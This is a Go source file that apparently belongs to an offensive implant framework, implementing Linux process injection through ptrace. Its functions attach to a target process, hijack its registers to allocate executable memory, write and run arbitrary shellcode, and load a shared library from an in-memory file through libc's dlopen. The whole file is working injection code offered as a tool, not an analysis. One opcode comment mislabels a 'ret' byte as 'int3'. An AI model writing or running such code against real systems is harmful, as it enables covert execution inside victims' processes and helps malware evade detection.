package taskrunner

import (
	"debug/elf"
	"fmt"
	"io/ioutil"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"os"
	"runtime"
	"strings"
	"syscall"

	"golang.org/x/sys/unix"
)

func getSymbolOffset(symbolName, libPath string) (uint64, error) {
	e, err := elf.Open(libPath)
	if err != nil {
		return 0, err
	}
	symbols, err := e.DynamicSymbols()
	if err != nil {
		return 0, err
	}
	for _, s := range symbols {
		if s.Name == symbolName {
			return s.Value, nil
		}
	}
	return 0, fmt.Errorf("symbol not found")
}

func allocateMap(pid int, size uint64, permissions int) (uint64, error) {
	var (
		res uint64
	)
	err := getRegistersAndRestore(pid, func(regs *syscall.PtraceRegs) error {
		backupData, err := readMem(pid, regs.Rip)
		backupRip := regs.Rip
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("readMem:", err)
			// {{end}}
			return err
		}
		var syscallCall = []byte{0x0f, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00} // syscall asm instruction
		err = writeMem(pid, regs.Rip, syscallCall)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("writeMem failed:", err)
			// {{end}}
			return err
		}
		regs.Rax = syscall.SYS_MMAP
		regs.Rdi = 0
		regs.Rsi = size
		regs.Rdx = uint64(permissions)
		regs.R10 = syscall.MAP_ANONYMOUS | syscall.MAP_PRIVATE
		regs.R8 = 0
		regs.R9 = 0

		err = syscall.PtraceSetRegs(pid, regs)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("PtraceSetRegs failed:", err)
			// {{end}}
			return err
		}
		// {{if .Config.Debug}}
		log.Println("[*] Registers set !")
		// {{end}}
		err = syscall.PtraceSingleStep(pid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("PtraceSingleStep failed:", err)
			// {{end}}
			return err
		}
		_, _, err = ptraceWait(pid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println(err)
			// {{end}}
			return err
		}
		err = syscall.PtraceSingleStep(pid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("PtraceSingleStep failed:", err)
			// {{end}}
			return err
		}
		_, _, err = ptraceWait(pid)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println(err)
			// {{end}}
			return err
		}
		var newRegs = &syscall.PtraceRegs{}
		err = syscall.PtraceGetRegs(pid, newRegs)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("PtraceGetRegs failed:", err)
			// {{end}}
			return err
		}
		// {{if .Config.Debug}}
		log.Println("[*] Got registers")
		// {{end}}
		res = newRegs.Rax
		// {{if .Config.Debug}}
		log.Printf("[*] New RIP at 0x%08x\n", newRegs.Rip)
		log.Printf("[*] Allocated memory at 0x%08x\n", res)
		// {{end}}
		allMaps, err := ProcMaps(pid)
		if err != nil {
			return err
		}
		// {{if .Config.Debug}}
		for _, m := range allMaps {
			if res > uint64(m.StartAddr) && res < uint64(m.EndAddr) {
				log.Printf("[*] Mapping in %s\n", m.Pathname)
				break
			}
		}
		// {{end}}
		err = writeMem(pid, backupRip, backupData)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("writeMem:", err)
			// {{end}}
			return err
		}
		return err
	})
	return res, err
}

func ptraceWait(pid int) (wpid int, status syscall.WaitStatus, err error) {
	wpid, err = syscall.Wait4(pid, &status, syscall.WALL, nil)
	if err != nil {
		return 0, 0, err
	}
	// {{if .Config.Debug}}
	log.Printf("wait: wpid=%5d, status=0x%06x\n", wpid, status)
	// {{end}}
	return wpid, status, nil
}

func getRegistersAndRestore(pid int, callback func(regs *syscall.PtraceRegs) error) error {
	backup := syscall.PtraceRegs{}
	err := syscall.PtraceGetRegs(pid, &backup)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[*] Old RIP at 0x%08x\n", backup.Rip)
	// {{end}}
	regs := backup
	err = callback(&regs)
	if err != nil {
		return err
	}
	return syscall.PtraceSetRegs(pid, &backup)
}

func writeMem(pid int, addr uint64, data []byte) error {
	c, err := syscall.PtracePokeData(pid, uintptr(addr), data)
	if err == nil {
		// {{if .Config.Debug}}
		log.Printf("[*] Wrote %d bytes\n", c)
		// {{end}}
	}
	return err
}

func readMem(pid int, addr uint64) ([]byte, error) {
	res := make([]byte, 2048)
	_, err := syscall.PtracePeekData(pid, uintptr(addr), res)
	return res, err
}

func writeToMemFD(data []byte) (string, error) {
	newFdName := "_"
	fd, err := unix.MemfdCreate(newFdName, unix.MFD_ALLOW_SEALING)
	if err != nil {
		return "", err
	}

	pid := os.Getpid()
	fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
	err = ioutil.WriteFile(fdPath, data, 0755)
	if err != nil {
		return "", err
	}
	return fdPath, nil
}

func getProgName(pid int) (string, error) {
	var progName string
	data, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return "", err
	}
	for _, b := range data {
		if b == 0x00 {
			break
		}
		progName += string(b)
	}
	return progName, nil
}

// Make sure we're inside the target main module
// and not inside some shared library code
func findSweetSpot(pid int) error {
	var module *ProcMap
	progName, err := getProgName(pid)
	if err != nil {
		return err
	}
	regs := syscall.PtraceRegs{}
	allMaps, err := ProcMaps(pid)
	if err != nil {
		return err
	}
	for _, m := range allMaps {
		if strings.Contains(m.Pathname, progName) && m.Perms.Execute {
			module = m
		}
	}
	if module == nil {
		return fmt.Errorf("can't find module")
	}
	for {
		err := syscall.PtraceSingleStep(pid)
		if err != nil {
			return err
		}

		_, _, err = ptraceWait(pid)
		if err != nil {
			return err
		}

		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			return err
		}

		if regs.Rip > uint64(module.StartAddr) && regs.Rip < uint64(module.EndAddr) {
			break
		}
	}
	return nil
}

func callDlopen(pid int, dataAddr uint64, dlopenAddr uint64) error {
	err := getRegistersAndRestore(pid, func(regs *syscall.PtraceRegs) error {
		// {{if .Config.Debug}}
		allMaps, _ := ProcMaps(pid)
		for _, m := range allMaps {
			if regs.Rip > uint64(m.StartAddr) && regs.Rip < uint64(m.EndAddr) {
				log.Printf("[*] RIP in %s\n", m.Pathname)
				break
			}
		}
		// {{end}}
		inject := []byte{0xff, 0xd0, 0xcc, 0x00, 0x00, 0x00, 0x00, 0x00} // call rax; int3
		// Backup stuff
		backupData, err := readMem(pid, regs.Rip)
		backupRip := regs.Rip
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("readMem:", err)
			// {{end}}
			return err
		}
		regs.Rax = dlopenAddr
		regs.Rdi = dataAddr
		regs.Rsi = 2 // RTLD_NOW

		err = syscall.PtraceSetRegs(pid, regs)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[!] PtraceSetRegs failed: %v\n", err)
			// {{end}}
			return err
		}
		// {{if .Config.Debug}}
		log.Println("[*] Registers set!")
		// {{end}}
		err = writeMem(pid, regs.Rip, inject)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("[!] writeMem failed:", err)
			// {{end}}
			return err
		}
		err = syscall.PtraceCont(pid, 0)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("[!] PtraceCont failed:", err)
			// {{end}}
			return err
		}
		_, _, err = ptraceWait(pid)
		if err != nil {
			return err
		}
		// {{if .Config.Debug}}
		log.Println("[*] Got to breakpoint")
		// {{end}}
		err = writeMem(pid, backupRip, backupData)
		if err != nil {
			// {{if .Config.Debug}}
			log.Println("[!] writeMem failed!")
			// {{end}}
			return err
		}
		// {{if .Config.Debug}}
		log.Println("[*] Restored old code")
		// {{end}}
		return err
	})
	return err
}

func callDlopenNoRet(pid int, dataAddr uint64, dlopenAddr uint64) error {
	var regs syscall.PtraceRegs
	err := syscall.PtraceGetRegs(pid, &regs)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	allMaps, _ := ProcMaps(pid)
	for _, m := range allMaps {
		if regs.Rip > uint64(m.StartAddr) && regs.Rip < uint64(m.EndAddr) {
			log.Printf("[*] RIP in %s\n", m.Pathname)
			break
		}
	}
	// {{end}}
	inject := []byte{0xff, 0xd0, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00} // call rax; int3
	regs.Rax = dlopenAddr
	regs.Rdi = dataAddr
	regs.Rsi = 2 // RTLD_NOW
	err = syscall.PtraceSetRegs(pid, &regs)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[!] PtraceSetRegs failed: %v\n", err)
		// {{end}}
		return err
	}
	// {{if .Config.Debug}}
	log.Println("[*] Registers set!")
	// {{end}}
	err = writeMem(pid, regs.Rip, inject)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("[!] writeMem failed:", err)
		// {{end}}
		return err
	}
	return err
}

func callShellcode(pid int, addr uint64) error {
	var regs syscall.PtraceRegs
	err := syscall.PtraceGetRegs(pid, &regs)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[*] Old RIP at 0x%08x\n", regs.Rip)
	// {{end}}
	inject := []byte{0xff, 0xd0, 0xcc, 0x00, 0x00, 0x00, 0x00, 0x00} // call rax; int3
	regs.Rax = addr
	err = syscall.PtraceSetRegs(pid, &regs)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[!] PtraceSetRegs failed: %v\n", err)
		// {{end}}
		return err
	}
	// {{if .Config.Debug}}
	log.Println("[*] Registers set!")
	// {{end}}
	err = writeMem(pid, regs.Rip, inject)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("[!] writeMem failed:", err)
		// {{end}}
		return err
	}
	return err
}

// remoteTask injects and run a shellcode in the remote process
func remoteTask(data []byte, pid int) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	// Attach to process
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return err
	}
	_, _, err = ptraceWait(pid)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Println("[*] Attached to", pid)
	// {{end}}
	perms := syscall.PROT_EXEC | syscall.PROT_READ | syscall.PROT_WRITE
	addr, err := allocateMap(pid, uint64(len(data)), perms)
	if err != nil {
		return err
	}
	err = findSweetSpot(pid)
	if err != nil {
		return err
	}
	err = writeMem(pid, addr, data)
	if err != nil {
		return err
	}
	err = callShellcode(pid, addr)
	if err != nil {
		return err
	}
	err = syscall.PtraceDetach(pid)
	if err != nil {
		return err
	}
	return nil
}

// libraryTask injects a shared library in the process
// designated by pid
func libraryTask(data []byte, pid int) error {
	procMaps, err := ProcMaps(pid)
	if err != nil {
		return err
	}
	var libcMap *ProcMap
	for _, m := range procMaps {
		if m.Offset == 0 &&
			m.Perms.Read &&
			!m.Perms.Execute &&
			!m.Perms.Write &&
			!m.Perms.Shared &&
			strings.Contains(m.Pathname, "/usr/lib64/libc-") {
			libcMap = m
		}
	}
	dlopenOffset, err := getSymbolOffset("__libc_dlopen_mode", libcMap.Pathname)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[*] __libc_dlopen_mode offset in %s is at 0x%08x\n", libcMap.Pathname, dlopenOffset)
	// {{end}}
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	// Attach to process
	err = syscall.PtraceAttach(pid)
	if err != nil {
		return err
	}
	_, _, err = ptraceWait(pid)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Println("[*] Attached to", pid)
	// {{end}}
	perms := syscall.PROT_READ | syscall.PROT_WRITE
	addr, err := allocateMap(pid, 8192, perms)
	if err != nil {
		return err
	}
	err = findSweetSpot(pid)
	if err != nil {
		return err
	}
	memfd, err := writeToMemFD(data)
	if err != nil {
		return err
	}
	memfdBytes := []byte(memfd)
	memfdBytes = append(memfdBytes, 0x00)
	err = writeMem(pid, addr, memfdBytes)
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("[*] Wrote %d bytes (%s) to 0x%08x\n", len(memfdBytes), memfd, addr)
	log.Printf("[*] Libc is at 0x%08x, dlopen is at 0x%08x\n", libcMap.StartAddr, uint64(libcMap.StartAddr)+dlopenOffset)
	// {{end}}
	err = callDlopenNoRet(pid, addr, uint64(libcMap.StartAddr)+dlopenOffset)
	if err != nil {
		return err
	}
	err = syscall.PtraceDetach(pid)
	if err != nil {
		return err
	}
	return nil
}
